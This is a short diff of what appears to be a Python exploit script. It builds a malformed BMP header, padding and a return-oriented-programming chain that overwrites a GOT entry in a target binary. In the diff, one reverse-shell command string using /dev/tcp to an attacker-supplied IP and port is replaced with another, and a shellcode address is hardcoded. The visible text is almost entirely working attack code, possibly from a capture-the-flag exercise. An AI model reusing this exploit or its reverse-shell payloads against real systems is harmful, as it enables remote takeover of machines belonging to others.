@@ -18,11 +18,11 @@ addr = 0x48a930
 movinrbp_rdi = 0x00000000004220e0
 
 headerfile = b'BMzL\x02\x00\x00\x00\x00\x00>\x00\x00\x00(\x00\x00\x00\xd3\x05\x00\x00!\x03\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00<L\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00'
-shellrv = f"/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done'\x00"
+shellrv = f"bash -c '/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1'\x00"
 shell = headerfile + b'a'*128
 
 off_ip = len(ip) + len(str(port)) - 16
-shell_addr = 0x48aeee + off_ip
+shell_addr = 0x48aed8 #+ off_ip
 
 shell += flat(
     pop_rax_rbx_rbp+1, 0x13e10, exe.got['gettext'] + 0x3d,
